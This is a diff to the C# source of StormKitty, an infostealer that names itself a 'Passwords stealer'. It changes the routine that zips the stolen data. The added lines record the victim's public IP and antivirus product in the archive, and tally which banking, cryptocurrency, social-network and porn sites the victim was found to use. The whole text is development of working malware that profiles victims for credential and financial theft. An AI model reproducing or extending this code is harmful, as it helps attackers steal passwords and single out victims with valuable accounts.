@@ -2,6 +2,7 @@
 using System.IO;
 using System.Linq;
 using StormKitty.Implant;
+using Stealer;
 
 namespace StormKitty
 {
@@ -58,14 +59,16 @@ namespace StormKitty
                 {
                     zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;
                     zip.Comment = "" +
-                        "\nStormKitty - Passwords stealer coded by LimerBoy with Love <3" +
+                        $"\nStormKitty v{Config.Version} - Passwords stealer coded by LimerBoy with Love <3" +
                         "\n" + StringsCrypt.github +
                         "\n" +
                         "\n== System Info ==" +
+                        "\nIP: " + SystemInfo.GetPublicIP() +
                         "\nDate: " + SystemInfo.datenow +
                         "\nUsername: " + SystemInfo.username +
                         "\nCompName: " + SystemInfo.compname +
                         "\nLanguage: " + SystemInfo.culture +
+                        "\nAntivirus: " + SystemInfo.GetAntivirus() +
                         "\n" +
                         "\n== Hardware ==" +
                         "\nCPU: " + SystemInfo.GetCPUName() +
@@ -74,16 +77,22 @@ namespace StormKitty
                         "\nHWID: " + SystemInfo.GetHardwareID() +
                         "\nPower: " + SystemInfo.GetBattery() +
                         "\nScreen: " + SystemInfo.ScreenMetrics() +
+                        "\n" +
+                        "\n== Domains ==" +
+                         Counter.GetLValue("Banking services", Counter.DetectedBankingServices, '-') +
+                         Counter.GetLValue("Cryptocurrency services", Counter.DetectedCryptoServices, '-') +
+                         Counter.GetLValue("Social networks", Counter.DetectedSocialServices, '-') +
+                         Counter.GetLValue("Porn websites", Counter.DetectedPornServices, '-') +
                         "\n";
                     if (setpassword)
-                        zip.Password = Implant.StringsCrypt.ArchivePassword;
+                        zip.Password = StringsCrypt.ArchivePassword;
                     zip.AddDirectory(directory);
                     zip.Save(directory + ".zip");
                 }
             }
 
             RecursiveDelete(directory);
-            System.Console.WriteLine("Archive " + new DirectoryInfo(directory).Name + " compression completed");
+            Logging.Log("Archive " + new DirectoryInfo(directory).Name + " compression completed");
             return directory + ".zip";
         }
 
